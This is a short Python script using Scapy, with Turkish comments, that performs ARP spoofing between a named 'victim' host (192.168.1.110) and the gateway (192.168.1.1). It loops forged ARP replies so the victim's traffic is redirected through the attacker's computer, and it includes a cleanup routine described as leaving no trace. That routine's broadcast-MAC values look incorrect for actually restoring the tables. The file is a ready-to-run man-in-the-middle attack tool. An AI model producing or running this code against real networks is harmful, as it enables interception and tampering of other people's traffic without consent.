from scapy.all import ARP, send
import time
import sys

# --- STAGE 2: ARP SPOOFER ---
# AMAÇ: 192.168.1.110 (Kurban) ile 192.168.1.1 (Modem) arasına girmek.

def spoof(target_ip, spoof_ip):
    # op=2 -> ARP Reply (Cevap veriyormuş gibi yap)
    # pdst -> Hedef (Kimi kandırıyoruz?)
    # psrc -> Kaynak (Kimi taklit ediyoruz?)
    # Scapy hedef MAC adresini otomatik bulur.
    
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip):
    # Saldırı bitince her şeyi düzelt (İz bırakma)
    packet = ARP(op=2, pdst=dest_ip, psrc=source_ip, hwsrc="ff:ff:ff:ff:ff:ff", hwdst="ff:ff:ff:ff:ff:ff")
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    # --- SENİN LİSTENE GÖRE AYARLAR ---
    
    # Kurban (Listeden seçtiğimiz)
    target_ip = "192.168.1.110" 
    
    # Modem (Listenin en başındaki)
    gateway_ip = "192.168.1.1" 
    
    try:
        print(f"[*] SALDIRI BAŞLADI: {target_ip} <---> {gateway_ip}")
        print("[*] Trafik senin bilgisayarına yönlendiriliyor... (Durdurmak için CTRL+C)")
        
        sent_packets_count = 0
        while True:
            # Kurbana: "Ben Modemim (192.168.1.1)" de
            spoof(target_ip, gateway_ip)
            
            # Modeme: "Ben Kurbanım (192.168.1.110)" de
            spoof(gateway_ip, target_ip)
            
            sent_packets_count += 2
            # Ekrana dinamik yazı yaz
            sys.stdout.write(f"\r[+] Gönderilen Zehirli Paket: {sent_packets_count}")
            sys.stdout.flush()
            time.sleep(2) # 2 saniyede bir yalan söyle
            
    except KeyboardInterrupt:
        print("\n[!] Saldırı Durduruldu. ARP tabloları düzeltiliyor...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[OK] Sistem normale döndü.")